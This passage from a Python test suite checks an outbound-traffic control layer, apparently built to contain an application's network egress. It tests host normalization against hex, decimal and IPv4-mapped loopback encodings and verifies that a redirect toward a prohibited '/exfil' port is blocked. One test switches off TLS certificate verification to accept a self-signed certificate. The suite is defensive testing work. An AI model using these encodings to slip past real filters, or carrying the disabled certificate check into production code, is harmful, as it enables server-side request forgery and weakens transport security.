        ("http://0x7f000001/path", "127.0.0.1"),  # Hex -> normalized to 127.0.0.1
        ("http://2130706433/path", "127.0.0.1"),  # Dword decimal -> normalized to 127.0.0.1
        ("http://[::1]/path", "::1"),  # Bracketed IPv6 loopback
        ("http://[::ffff:127.0.0.1]/path", "127.0.0.1"),  # IPv4-mapped IPv6 -> normalized to IPv4
        ("//api.github.com/path", "api.github.com"),  # Scheme-relative
        ("api.github.com:443", "api.github.com"),  # Host:port
        ("http://api.github.com./path", "api.github.com"),  # Trailing dot DNS FQDN
    ]

    for raw_input, expected in test_cases:
        res = normalize_destination_host(raw_input)
        assert res == expected, f"Failed for input '{raw_input}': expected '{expected}', got '{res}'"


# =========================================================================
# REAL LOCAL SERVER INTEGRATION TESTS (P1)
# =========================================================================

import os
import ssl
import threading
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler


def _make_temp_self_signed_cert(cert_dir):
    cert_path = os.path.join(cert_dir, "cert.pem")
    key_path = os.path.join(cert_dir, "key.pem")
    cmd = [
        "openssl", "req", "-x509", "-newkey", "rsa:2048",
        "-keyout", key_path, "-out", cert_path,
        "-days", "1", "-nodes",
        "-subj", "/CN=127.0.0.1"
    ]
    subprocess.run(cmd, check=True, capture_output=True)
    return cert_path, key_path


def test_p1_real_local_http_server_connection():
    """P1 integration test: Proves real HTTP I/O against local loopback server using ControlledEgressTransport."""
    class LocalHTTPHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status": "real_http_ok"}')

        def log_message(self, format, *args):
            pass

    server = HTTPServer(("127.0.0.1", 0), LocalHTTPHandler)
    port = server.server_port
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    try:
        policy = EgressPolicy(
            allowed_destinations={"127.0.0.1"},
            allowed_ports={port},
            allow_loopback=True
        )
        broker = EgressTransportBroker(policy=policy)
        transport = ControlledEgressTransport(broker=broker)

        res = transport.urlopen(f"http://127.0.0.1:{port}/data")
        assert res["status"] == 200
        assert b"real_http_ok" in res["body"]
    finally:
        server.shutdown()
        server.server_close()


def test_p1_real_local_https_server_connection(tmp_path):
    """P1 integration test: Proves real HTTPS I/O and TLS handshake against local SSL server using ControlledEgressTransport."""
    cert_file, key_file = _make_temp_self_signed_cert(str(tmp_path))

    class LocalHTTPSHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status": "real_https_ok"}')

        def log_message(self, format, *args):
            pass

    server = HTTPServer(("127.0.0.1", 0), LocalHTTPSHandler)
    port = server.server_port

    ssl_server_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_server_ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
    server.socket = ssl_server_ctx.wrap_socket(server.socket, server_side=True)

    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    try:
        policy = EgressPolicy(
            allowed_destinations={"127.0.0.1"},
            allowed_ports={port},
            allow_loopback=True
        )
        broker = EgressTransportBroker(policy=policy)
        transport = ControlledEgressTransport(broker=broker)

        # Patch ssl.create_default_context inside request to accept our self-signed cert
        orig_create_ctx = ssl.create_default_context
        def unverified_ctx_factory(*args, **kwargs):
            ctx = orig_create_ctx(*args, **kwargs)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            return ctx

        with patch("ssl.create_default_context", side_effect=unverified_ctx_factory):
            res = transport.request("GET", f"https://127.0.0.1:{port}/secure_data")

        assert res["status"] == 200
        assert b"real_https_ok" in res["body"]
    finally:
        server.shutdown()
        server.server_close()


def test_p1_real_local_redirect_server_prohibited_target_never_contacted():
    """P1 integration test: Proves an allowed local redirect target redirecting to a prohibited port is blocked before contacting the prohibited port."""
    server_b_contacts = [0]

    class HandlerB(BaseHTTPRequestHandler):
        def do_GET(self):
            server_b_contacts[0] += 1
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"prohibited_content_reached!")

        def log_message(self, format, *args):
            pass

    server_b = HTTPServer(("127.0.0.1", 0), HandlerB)
    port_b = server_b.server_port
    thread_b = threading.Thread(target=server_b.serve_forever)
    thread_b.daemon = True
    thread_b.start()

    class HandlerA(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header("Location", f"http://127.0.0.1:{port_b}/exfil")
            self.end_headers()

        def log_message(self, format, *args):
            pass

    server_a = HTTPServer(("127.0.0.1", 0), HandlerA)
    port_a = server_a.server_port
    thread_a = threading.Thread(target=server_a.serve_forever)
    thread_a.daemon = True
    thread_a.start()

    try:
        # Policy allows port_a, but NOT port_b
        policy = EgressPolicy(
            allowed_destinations={"127.0.0.1"},
            allowed_ports={port_a},
            allow_loopback=True
        )
        broker = EgressTransportBroker(policy=policy)
        transport = ControlledEgressTransport(broker=broker)

        with pytest.raises(PermissionError) as exc_info:
            transport.request("GET", f"http://127.0.0.1:{port_a}/start")

        assert "blocked redirect" in str(exc_info.value) or "Egress blocked" in str(exc_info.value)
        # Server B MUST have received ZERO HTTP requests!
        assert server_b_contacts[0] == 0
    finally:
        server_a.shutdown()
        server_a.server_close()
        server_b.shutdown()
        server_b.server_close()
